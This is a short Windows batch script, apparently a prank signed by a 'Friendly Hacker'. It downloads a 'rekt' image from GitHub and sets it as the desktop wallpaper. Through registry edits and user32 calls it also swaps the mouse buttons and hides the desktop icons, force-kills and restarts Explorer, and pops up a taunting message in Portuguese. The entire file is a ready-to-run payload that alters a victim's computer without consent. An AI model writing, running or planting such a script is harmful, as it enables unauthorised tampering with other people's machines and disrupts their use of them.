@echo off

:: Download wallpaper from GitHub
set imgPath=%TEMP%\rekt.png
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/joaomotacosta/scripts/refs/heads/main/fun/rekt.png' -OutFile '%imgPath%'"

:: Set wallpaper
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imgPath%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Swap mouse buttons
rundll32 user32.dll,SwapMouseButton

:: Hide desktop icons
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start explorer.exe

:: Show a harmless message
msg * "Foste visitado pelo Friendly Hacker MUAHAHAHA"